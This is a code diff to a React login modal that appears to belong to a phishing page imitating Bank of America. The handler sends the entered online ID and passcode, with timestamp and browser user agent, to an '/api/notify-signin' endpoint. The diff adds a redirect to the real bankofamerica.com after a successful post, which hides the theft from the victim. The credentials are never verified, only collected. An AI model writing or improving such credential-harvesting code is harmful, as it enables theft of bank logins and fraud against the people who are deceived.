@@ -12,23 +12,31 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
   const [passcode, setPasscode] = useState("")
 
   const handleMobileSignIn = async () => {
-    try {
-      await fetch("/api/notify-signin", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          onlineId,
-          passcode,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-        }),
-      })
-    } catch (error) {
-      console.error("Failed to notify sign-in:", error)
+  try {
+    const response = await fetch("/api/notify-signin", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        onlineId,
+        passcode,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+      }),
+    });
+
+    if (response.ok) {
+      // ✅ redirect if API call was successful
+      window.location.href = "https://bankofamerica.com"; 
+    } else {
+      console.error("API returned an error:", response.status);
     }
+  } catch (error) {
+    console.error("Failed to notify sign-in:", error);
   }
+};
+
 
   if (!isOpen) return null
 
